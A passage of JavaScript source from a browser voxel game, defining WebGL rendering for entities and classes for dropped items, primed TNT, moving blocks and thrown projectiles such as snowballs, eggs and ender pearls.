      projectionMatrix.set(proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0)
      projectionMatrix = projectionMatrix.elements
			const modelViewProjectionMatrix = entityMatrices.modelViewProjectionMatrix
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = this.glow ? 1 : this.world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = this.world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, blockLight)
			gl.uniform1f(glCache.uSkylightEntity, skysLight)
      if(this.mob) gl.uniform1f(glCache.harmEffectEntity, this.harmEffect || this.dieEffect)
      if(this.tint) gl.uniform3f(glCache.tintEntity, this.tint[0],this.tint[1],this.tint[2])
      if(this.tintGray) gl.uniform1i(glCache.tintGrayEntity, 1)
      if(this.shader) gl.uniform1i(glCache.shaderEntity, this.shader)
			if(this.alwaysRender) gl.uniform3f(glCache.uPosEntity, 0, 0, 0)
			else gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			if(this.vao){
				gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
				gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
				glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
				gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
				glExtensions.vertex_array_object.bindVertexArrayOES(null)
			}
      for(var part in this.parts){
        this.renderPart(this.parts[part], modelMatrix, modelViewProjectionMatrix, projectionMatrix, viewMatrix, renderx, rendery, renderz, blockLight)
      }
      if(this.mob) gl.uniform1f(glCache.harmEffectEntity, 0)
      if(this.tint) gl.uniform3f(glCache.tintEntity, 1,1,1)
      if(this.tintGray) gl.uniform1i(glCache.tintGrayEntity, 0)
      if(this.shader) gl.uniform1i(glCache.shaderEntity, 0)
      if(this.burning){
        entityFire.render(this)
      }
			if(this.nameText && (p.thirdPerson || this !== p.spectating && this !== p)) this.nameText.render()
		}
		//todo n: share same entity on server
		setPartShapes(bones){
			for(let i in bones){
				let shape = bones[i]
				if(!this.parts[shape.boneName]){
					let x=0,y=0,z=0, rx=0,ry=0,rz=0
					let w=1,h=1,d=1
					this.parts[shape.boneName] = {
						name:shape.boneName,
						size:null, vao:null,
						x,y,z,w,h,d,rx,ry,rz,ry2:0, //x,y,z,rx,ry are relative to entity position
						px:x,py:y,pz:z,prx:rx,pry:ry,prz:rz,
						originalX:x, originalY:y, originalZ:z,
						attached:shape.attached, attachChain:shape.attachChain,
						pivot: shape.pivot
					}
				}
				let part = this.parts[shape.boneName]
				let vao = generateVAO(shape)
				part.size = vao.size
				part.vao = vao.vao
			}
		}
    addPart(name,size,vao,x,y,z,w,h,d,rx,ry,rz = 0,attached = null,glow = false){
      let part =  this.parts[name] = {
        name,
        size,vao,
        x,y,z,w,h,d,rx,ry,rz,ry2:0, //x,y,z,rx,ry are relative to entity position
        px:x,py:y,pz:z,prx:rx,pry:ry,prz:rz,
        originalX:x, originalY:y, originalZ:z,
				attached, glow
      }
			if(vao && vao.tHeVerticesBuffer){
				part.verticesBuffer = vao.tHeVerticesBuffer
				part.textureBuffer = vao.tHeTextureBuffer
				part.normalBuffer = vao.tHeNormalBuffer
			}
			let attachChain = []
			let part2 = part
			while(part2.attached){
				part2 = this.parts[part2.attached]
				if(!part2) break
				attachChain.push(part2.name)
			}
			attachChain.reverse()
			part.attachChain = attachChain
			return part
    }
    renderPart(part, modelMatrix, modelViewProjectionMatrix, projectionMatrix, viewMatrix, x,y,z, blockLight){
			if(part.hidden) return
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
      modelMatrix.identity()
      modelMatrix.translate(x, y, z)
			let prevYaw = this.previousYaw
			if(this.yaw - prevYaw > Math.PI) prevYaw += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
			if(this.yaw - prevYaw < -Math.PI) prevYaw -= Math.PId
			modelMatrix.rotX(lerp(diff,this.previousPitch,this.pitch))
			modelMatrix.rotY(lerp(diff,prevYaw,this.yaw)+this.offsetry)
			if(this.dieRotate){
				modelMatrix.translate(0,-this.height/2,0)
				modelMatrix.rotZ(this.dieRotate)
				modelMatrix.translate(0,this.height/2,0)
			}
			if(this.extraSize) modelMatrix.scale(1 + this.extraSize, 1 + this.extraSize, 1 + this.extraSize)
			if(part.attached){
				for(let partName of part.attachChain){
					let part2 = this.parts[partName]
					modelMatrix.translate(part2.x, part2.y, part2.z)
					prevYaw = part2.pry
					if(part2.ry - prevYaw > Math.PI) prevYaw += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
					if(part2.ry - prevYaw < -Math.PI) prevYaw -= Math.PId
					modelMatrix.rotZ(lerp(diff,part2.prz,part2.rz))
					if(part2.ry2) modelMatrix.rotY(lerp(diff,part2.pry2,part2.ry2))
					modelMatrix.rotX(lerp(diff,part2.prx,part2.rx))
					modelMatrix.rotY(lerp(diff,prevYaw,part2.ry))
				}
			}
			modelMatrix.translate(part.x, part.y, part.z)
			if(part.pivot) modelMatrix.translate(part.pivot[0], part.pivot[1], part.pivot[2])
			prevYaw = part.pry
			if(part.ry - prevYaw > Math.PI) prevYaw += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
			if(part.ry - prevYaw < -Math.PI) prevYaw -= Math.PId
      modelMatrix.rotZ(lerp(diff,part.prz,part.rz))
      if(part.ry2) modelMatrix.rotY(lerp(diff,part.pry2,part.ry2))
			modelMatrix.rotX(lerp(diff,part.prx,part.rx))
			modelMatrix.rotY(lerp(diff,prevYaw,part.ry))
			if(part.pivot) modelMatrix.translate(-part.pivot[0], -part.pivot[1], -part.pivot[2])
      modelMatrix.scale(part.w, part.h, part.d)
      
      modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
      modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			if(part.glow) gl.uniform1f(glCache.uBlockLightEntity, 1)
      if(part.tint){
        gl.uniform3f(glCache.tintEntity, part.tint[0],part.tint[1],part.tint[2])
        gl.uniform1i(glCache.tintGrayEntity, 0)
      }
      
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(part.vao)
			gl.drawElements(gl.TRIANGLES, 6 * part.size, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
			
      if(part.tint){
        gl.uniform3f(glCache.tintEntity, 1,1,1)
        gl.uniform1i(glCache.tintGrayEntity, 0)
      }
			if(part.glow) gl.uniform1f(glCache.uBlockLightEntity, blockLight)
    }
    facePlayer(){
      this.yaw = Math.PI2 - atan2(p.camera.z - this.z, p.camera.x - this.x)
      var adjacent = dist2(this.x,this.z,p.camera.x,p.camera.z)
      this.pitch = Math.PId - atan2(p.camera.y - this.y, adjacent)
    }
    pointAt(x,y,z){
      this.yaw = Math.PId - (atan2(z - this.z, x - this.x) + Math.PI2 + Math.PI)
      var adjacent = dist2(this.x,this.z,x,z)
      this.pitch = Math.PId - atan2(y - this.y, adjacent)
    }
		delete(){
			if(this.verticesBuffer){
				gl.deleteBuffer(this.verticesBuffer)
				gl.deleteBuffer(this.textureBuffer)
			}
			if(this.normalBuffer){
				gl.deleteBuffer(this.normalBuffer)
			}
			for(let i in this.parts){
				let part = this.parts[i]
				if(part.verticesBuffer){
					gl.deleteBuffer(part.verticesBuffer)
					gl.deleteBuffer(part.textureBuffer)
				}
				if(part.normalBuffer){
					gl.deleteBuffer(part.normalBuffer)
				}
			}
		}
	}

	entities[entities.length] = class Item extends Entity {
		static name2 = "Item"
		constructor(x, y, z, velx, vely, velz, blockID, autoSetVel, amount, durability = null, name = null, from) {
			super(x, y, z, 0, 0, velx, vely, velz, 0.25, 0.25, 0.25, null, null, 0, 300000/*1500000*/, glExtensions.vertex_array_object.createVertexArrayOES())
      this.block = blockID
      this.from = from || undefined
      this.durability = durability
      this.name = name
      this.amount = amount || 1
			this.updateShape()
      this.gravityStength = -0.07
      this.noHitbox = true
      this.canFloat = true
			this.cullFace = true
      
      if(autoSetVel){
        this.velx = (Math.random()-0.5) * 0.2
        this.vely = Math.random() * 0.2
        this.velz = (Math.random()-0.5) * 0.2
      }
		}
    goCloserToPlayer(e){
      let xDist = this.x - e.x
      let yDist = this.y - (e.y - e.height*0.5)
      let zDist = this.z - e.z
      var hRange = 1.425
      let comeCloser = xDist > -hRange && xDist < hRange && yDist > -0.75 && yDist < 2.3 && zDist > -hRange && zDist < hRange
      if(comeCloser){
        this.moveTowards(e.x, Math.min(Math.max(this.y, e.y - e.height*0.5),e.y+e.height*0.5), e.z, hRange,2.3,hRange, 3)
      }
      /*if(pickup){
        var dist = dist3(this.x, this.y, this.z, p.x, p.y, p.z)
        var dist2 = dist3(this.x, this.y, this.z, p.x, p.y-1, p.z)
        pickup = ((1 >= dist) && (dist >= -1)) || ((1 >= dist2) && (dist2 >= -1))
      }*/
    }
    update() {
			this.updateVelocity(now)
		  this.move(now)
      
      this.yaw += 0.05;
      if(this.yaw > Math.PId){
        this.yaw -= Math.PId
        this.previousYaw -= Math.PId
      }
      
      if(now - this.spawn > 1000){
        if(!p.spectator && !p.die && p.dimension === this.dimension) this.goCloserToPlayer(p)
        if(multiplayer) for(var i in players){
          var P = players[i]
          if(!P.hidden && !P.die && P.dimension === this.dimension) this.goCloserToPlayer(P)
        }
      }
      
      if(this.willUpdateShape){
        this.updateShape()
        this.willUpdateShape = false
      }
      
      this.offsetY = -0.1 * cos(this.yaw*2) + 0.15
      
      let id = this.block
      if(id && blockData[id].tint){
        let biome = this.world.getBiome(round(this.x),round(this.y),round(this.z),this.dimension)
        let tints = blockData[id].tint
        this.tint = tints[biome] || tints.default
        this.tintGray = true
      }
    }
		shape1 = [0,0,0]
		shape2 = [-1,-1,-1, 1,1,1]
		shape3 = [-1,-1,-1, 1,1,1, -0.5,0,0.5]
		shape4 = [-1,-1,-1, 1,1,1, -0.5,0,0.5, 0.5,1.5,-0.5]
		shape5 = [-1,-1,-1, 1,1,1, -0.5,0,0.5, 0.5,1.5,-0.5, 1.5,0.75,0]
    updateShape(){
      let amount
      if(this.amount === 1){
        amount = this.shape1
      }else if(this.amount <= 16){
        amount = this.shape2
      }else if(this.amount <= 32){
        amount = this.shape3
      }else if(this.amount <= 48){
        amount = this.shape4
      }else{
        amount = this.shape5
      }
      const block = blockData[this.block]
			const tex = block.textures
			const shape = block.shape
			const shapeVerts = shape.verts
			const shapeTexVerts = shape.texVerts
			const size = shape.size*(amount.length/3)
			const shapeNormal = shape.normal
			let blockSides = Object.keys(Block)
			let texNum = 0
			let texture = []
			let index = 0
			let verts = [], vertIndex = 0
			let normal = []
			let offsetX = 0, offsetY = 0, offsetZ = 0
			for(let amounti = 0; amounti < amount.length; amounti += 3){
				offsetX = amount[amounti]/4, offsetY = amount[amounti+1]/4, offsetZ = amount[amounti+2]/4
				texNum = 0
				for (let n = 0; n < 6; n++) {
					let side = blockSides[n]
					let directionalFaces = shapeVerts[n]
					for (let facei = 0; facei < directionalFaces.length; facei++) {
						let texShapeVerts = shapeTexVerts[n][facei]
						let texVerts
						texVerts = textureCoords[textureMap[texShapeVerts.texture] || tex && textureMap[tex[texNum]] || textureMap.error]
						let tx = texVerts[0]
						let ty = texVerts[1]
						let tw = texVerts[2]-tx
						let th = texVerts[5]-ty
						texture[index    ] = tx + texShapeVerts[0]*tw
						texture[index + 1] = ty + texShapeVerts[1]*th
						texture[index + 2] = tx + texShapeVerts[2]*tw
						texture[index + 3] = ty + texShapeVerts[3]*th
						texture[index + 4] = tx + texShapeVerts[4]*tw
						texture[index + 5] = ty + texShapeVerts[5]*th
						texture[index + 6] = tx + texShapeVerts[6]*tw
						texture[index + 7] = ty + texShapeVerts[7]*th
						index += 8
						let faceVerts = directionalFaces[facei]
						verts[vertIndex] = faceVerts[0]+offsetX
						verts[vertIndex+1] = faceVerts[1]+offsetY
						verts[vertIndex+2] = faceVerts[2]+offsetZ
						verts[vertIndex+3] = faceVerts[3]+offsetX
						verts[vertIndex+4] = faceVerts[4]+offsetY
						verts[vertIndex+5] = faceVerts[5]+offsetZ
						verts[vertIndex+6] = faceVerts[6]+offsetX
						verts[vertIndex+7] = faceVerts[7]+offsetY
						verts[vertIndex+8] = faceVerts[8]+offsetZ
						verts[vertIndex+9] = faceVerts[9]+offsetX
						verts[vertIndex+10] = faceVerts[10]+offsetY
						verts[vertIndex+11] = faceVerts[11]+offsetZ
						vertIndex += 12
						normal.push(...shapeNormal[n][facei],...shapeNormal[n][facei],...shapeNormal[n][facei],...shapeNormal[n][facei])
					}
					texNum++
				}
			}
      
      var vertices = new Float32Array(verts)
      texture = new Float32Array(texture)
      
			const verticesBuffer = gl.createBuffer()
			const textureBuffer = gl.createBuffer()
			const normalBuffer = gl.createBuffer()
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

			gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
			gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW)
			gl.vertexAttribPointer(glCache.aVertexEntity, 3, gl.FLOAT, false, 0, 0)

			gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
			gl.bufferData(gl.ARRAY_BUFFER, texture, gl.STATIC_DRAW)
			gl.vertexAttribPointer(glCache.aTextureEntity, 2, gl.FLOAT, false, 0, 0)
			
			gl.bindBuffer(gl.ARRAY_BUFFER, normalBuffer)
			gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(normal), gl.STATIC_DRAW)
			gl.vertexAttribPointer(glCache.aNormalEntity, 3, gl.FLOAT, false, 0, 0)

			gl.enableVertexAttribArray(glCache.aVertexEntity)
			gl.enableVertexAttribArray(glCache.aTextureEntity)
			gl.enableVertexAttribArray(glCache.aNormalEntity)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
      
      this.faces = size
    }
	}
  let BlockEntity = entities[entities.length] = class BlockEntity extends Entity{
		static name2 = "BlockEntity"
    constructor(blockID, x,y,z, solidOnGround){
      let v = generateBlockVAO(blockID)
      super(x, y, z, 0, 0, 0, 0, 0, 1, 1, 1, null, null, v.size, 1500000, v.vao)
      this.block = blockID
      this.solidOnGround = solidOnGround
      this.lastY = y
      this.noHitbox = true
			this.cullFace = true
    }
    changeBlock(blockID){
      if(this.block === blockID) return
      this.block = blockID
      let v = generateBlockVAO(blockID)
      this.faces = v.size
			this.vao = v.vao
    }
    update() {
			this.updateVelocity(now)
			this.move(now)
      
      var id = this.block
      if(id && blockData[id].tint){
        var biome = this.world.getBiome(round(this.x),round(this.y),round(this.z),this.dimension)
        var tints = blockData[id].tint
        this.tint = tints[biome] || tints.default
        this.tintGray = true
      }
		}
  }
  
  let PrimedTNT = entities[entities.length] = class PrimedTNT extends BlockEntity{
		static name2 = "PrimedTNT"
    constructor(x,y,z, timerStart, tntBlockId = blockIds.tnt){
      super(tntBlockId, x,y,z)
      this.velx = (Math.random() * 0.1) - 0.05
      this.vely = Math.random() * 0.1
      this.velz = (Math.random() * 0.1) - 0.05
      
      this.timerStart = timerStart || this.spawn
      this.timeLimit = 80
      
      this.tntBlockId = tntBlockId
    }
    update() {
			this.updateVelocity(now)
			this.move(now)
      
      var i = Math.floor((now - this.timerStart) / 250)
      this.shader = 0
      if(!(i%2)){
        this.shader = 1
        if(!performFast) this.world.addParticle(new entities[entityIds.SmokeParticle](this.x,this.y+0.5-0.125,this.z), this.dimension)
      }
      if((now - this.spawn) / tickTime >= this.timeLimit - 10){
        //get bigger
        this.extraSize = min(-((this.timeLimit - 10) - ((now - this.spawn) / tickTime)) / 40,0.25)
				this.shader = 1
      }
		}
  }
  entities[entities.length] = class PrimedSuperTNT extends PrimedTNT{
		static name2 = "PrimedSuperTNT"
    constructor(x,y,z, timerStart){
      super(x,y,z, timerStart, blockIds.tnt | SLAB)
    }
  }
  entities[entities.length] = class PrimedUltraTNT extends PrimedTNT{
		static name2 = "PrimedUltraTNT"
    constructor(x,y,z, timerStart){
      super(x,y,z, timerStart, blockIds.tnt | STAIR)
    }
  }
  entities[entities.length] = class PrimedUnTNT extends PrimedTNT{
		static name2 = "PrimedUnTNT"
    constructor(x,y,z, timerStart){
      super(x,y,z, timerStart, blockIds.untnt)
    }
  }
  
  entities[entities.length] = class MovingBlock extends BlockEntity{
		static name2 = "MovingBlock"
		noRemoteDelete = true
    constructor(block,x,y,z,mx,my,mz,despawns, solidWhenDone = false, tags = null){
      super(block, x,y,z)
      this.sx = x //s stands for start
      this.sy = y
      this.sz = z
      this.mx = mx //m stands for end
      this.my = my
      this.mz = mz
      this.despawns = despawns //also tells how much time for it to move
      this.solidWhenDone = solidWhenDone
      this.tags = tags
      this.canStandOn = true
      this.endAs = null
			this.spawn2 = performance.now()
    }
		setPos(){}
    update() {
			if (this.lastUpdate - this.spawn2 - tickTime > this.despawns) {
				this.canDespawn = true
			}
			this.previousX = this.x
			this.previousY = this.y
			this.previousZ = this.z
      this.lastUpdate = now
      
      var prog = min((now - this.spawn2) / this.despawns, 1)
      this.x = lerp(prog, this.sx, this.mx)
      this.y = lerp(prog, this.sy, this.my)
      this.z = lerp(prog, this.sz, this.mz)
      
      this.velx = this.x - this.previousX
      this.vely = this.y - this.previousY
      this.velz = this.z - this.previousZ

      let id = this.block
      if(id && blockData[id].tint){
        let biome = this.world.getBiome(round(this.x),round(this.y),round(this.z),this.dimension)
        let tints = blockData[id].tint
        this.tint = tints[biome] || tints.default
        this.tintGray = true
      }
		}
  }
	entities[entities.length] = class BlockDisplay extends BlockEntity{
		static name2 = "BlockDisplay"
    constructor(block,x,y,z,w,h,d){
      super(block, x,y,z, w,h,d)
			this.width = w
			this.height = h
			this.depth = d
    }
    update() {
      let id = this.block
      if(id && blockData[id].tint){
        let biome = this.world.getBiome(round(this.x),round(this.y),round(this.z),this.dimension)
        let tints = blockData[id].tint
        this.tint = tints[biome] || tints.default
        this.tintGray = true
      }
		}
  }
  
  entities[entities.length] = class EnderPearl extends BlockEntity{
		static name2 = "EnderPearl"
    constructor(x,y,z,velx,vely,velz,from){
      super(blockIds.enderPearl, x,y,z)
      this.velx = velx
      this.vely = vely
      this.velz = velz
      this.from = p.id
      this.facesPlayer = true
      
      this.gravityStength = -0.04
    }
    update() {
			this.updateVelocity(now)
			this.move(now)
      
      this.canFacePlayer = true
		}
    render(){
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width+this.extraSize,this.height+this.extraSize,this.depth+this.extraSize)) return
      renderedEntities++

      if(this.canFacePlayer) {
        this.facePlayer()
        this.canFacePlayer = false
      }
      
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
			const offsetY = this.offsetY
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = ((this.y - this.previousY) * diff + this.previousY) + offsetY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      
			const modelMatrix = entityMatrices.modelMatrix;
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery, renderz)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width + this.extraSize, this.height + this.extraSize, this.depth + this.extraSize)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			let projectionMatrix = entityMatrices.projectionMatrix
      projectionMatrix.set(proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0)
      projectionMatrix = projectionMatrix.elements
			const modelViewProjectionMatrix = entityMatrices.modelViewProjectionMatrix
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = this.world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = this.world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, blockLight)
			gl.uniform1f(glCache.uSkylightEntity, skysLight)
      gl.uniform1f(glCache.harmEffectEntity, 0)
			gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
    }
  }
  
  entities[entities.length] = class Snowball extends BlockEntity{
		static name2 = "Snowball"
    constructor(x,y,z,velx,vely,velz){
      super(blockIds.snowball, x,y,z)
      this.velx = velx
      this.vely = vely
      this.velz = velz
      this.from = p.id
      this.facesPlayer = true
      
      this.gravityStength = -0.04
    }
    update() {
			this.updateVelocity(now)
			this.move(now)
      this.canFacePlayer = true
		}
    render(){
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width+this.extraSize,this.height+this.extraSize,this.depth+this.extraSize)) return
      renderedEntities++

      if(this.canFacePlayer) {
        this.facePlayer()
        this.canFacePlayer = false
      }
      
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
			const offsetY = this.offsetY
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = ((this.y - this.previousY) * diff + this.previousY) + offsetY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      
			const modelMatrix = entityMatrices.modelMatrix;
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery, renderz)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width + this.extraSize, this.height + this.extraSize, this.depth + this.extraSize)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			let projectionMatrix = entityMatrices.projectionMatrix
      projectionMatrix.set(proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0)
      projectionMatrix = projectionMatrix.elements
			const modelViewProjectionMatrix = entityMatrices.modelViewProjectionMatrix
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = this.world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = this.world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, blockLight)
			gl.uniform1f(glCache.uSkylightEntity, skysLight)
			gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
    }
  }
	entities[entities.length] = class SmallFireball extends BlockEntity{
		static name2 = "SmallFireball"
    constructor(x,y,z,velx,vely,velz){
      super(blockIds.fireCharge, x,y,z)
			this.width = this.height = this.depth = 0.3125
      this.velx = velx
      this.vely = vely
      this.velz = velz
      this.from = p.id
      this.facesPlayer = true
      
      this.gravityStength = -0.07
    }
    update() {
			this.updateVelocity(now)
			this.move(now)
      this.canFacePlayer = true
		}
    render(){
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width+this.extraSize,this.height+this.extraSize,this.depth+this.extraSize)) return
      renderedEntities++

      if(this.canFacePlayer) {
        this.facePlayer()
        this.canFacePlayer = false
      }
      
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
			const offsetY = this.offsetY
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = ((this.y - this.previousY) * diff + this.previousY) + offsetY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      
			const modelMatrix = entityMatrices.modelMatrix;
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery, renderz)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width + this.extraSize, this.height + this.extraSize, this.depth + this.extraSize)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			let projectionMatrix = entityMatrices.projectionMatrix
      projectionMatrix.set(proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0)
      projectionMatrix = projectionMatrix.elements
			const modelViewProjectionMatrix = entityMatrices.modelViewProjectionMatrix
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = this.world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = this.world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, blockLight)
			gl.uniform1f(glCache.uSkylightEntity, skysLight)
			gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
    }
  }
  
  entities[entities.length] = class Egg extends BlockEntity{
		static name2 = "Egg"
    constructor(x,y,z,velx,vely,velz){
      super(blockIds.egg, x,y,z)
      this.velx = velx
      this.vely = vely
      this.velz = velz
      this.from = p.id
      this.facesPlayer = true
      
      this.gravityStength = -0.07
    }
    update() {
			this.updateVelocity(now)
			this.move(now)
      this.canFacePlayer = true
		}
    render(){
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width+this.extraSize,this.height+this.extraSize,this.depth+this.extraSize)) return
      renderedEntities++

      if(this.canFacePlayer) {
        this.facePlayer()
        this.canFacePlayer = false
      }
      
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
			const offsetY = this.offsetY
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = ((this.y - this.previousY) * diff + this.previousY) + offsetY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      
			const modelMatrix = entityMatrices.modelMatrix;
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery, renderz)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width + this.extraSize, this.height + this.extraSize, this.depth + this.extraSize)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			let projectionMatrix = entityMatrices.projectionMatrix
      projectionMatrix.set(proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0)
      projectionMatrix = projectionMatrix.elements
			const modelViewProjectionMatrix = entityMatrices.modelViewProjectionMatrix
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = this.world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = this.world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, blockLight)
			gl.uniform1f(glCache.uSkylightEntity, skysLight)
			gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
    }
  }
  
  entities[entities.length] = class SlingshotShot extends BlockEntity{
		static name2 = "SlingshotShot"
